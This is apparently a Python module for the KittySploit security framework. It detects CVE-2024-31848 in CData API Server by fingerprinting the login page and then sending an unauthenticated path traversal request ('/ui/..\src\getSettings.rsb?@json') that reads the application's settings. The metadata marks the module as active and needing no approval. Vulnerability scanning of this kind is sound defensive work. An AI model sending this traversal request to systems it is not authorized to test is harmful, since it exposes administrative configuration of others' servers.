#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A path traversal vulnerability exists in the Java version of CData API Server < 23."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CData API Server < 23.4.8844 - Path Traversal Detection',
        'description': 'A path traversal vulnerability exists in the Java version of CData API Server < 23.4.8844 when running using the embedded Jetty server, which could allow an unauthenticated remote attacker to gain complete administrative access to the application.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'cdata', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-31848',
            'https://github.com/Stuub/CVE-2024-31848-PoC/blob/main/CVE-2024-31848.py',
            'https://www.tenable.com/cve/CVE-2024-31848',
            'https://www.tenable.com/security/research/tra-2024-09',
            'https://github.com/Stuub/CVE-2024-31848-PoC',
        ],
        'cve': 'CVE-2024-31848',
    }

    def run(self):
        path = '/login.rst'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<title>CData - API Server</title>',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/ui/..\\src\\getSettings.rsb?@json'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': '{{RootURL}}'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"items":[{', ':"true"', 'notifyemail',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='CData API Server < 23.4.8844 - Path Traversal detected', path=path)
            return True
        return False

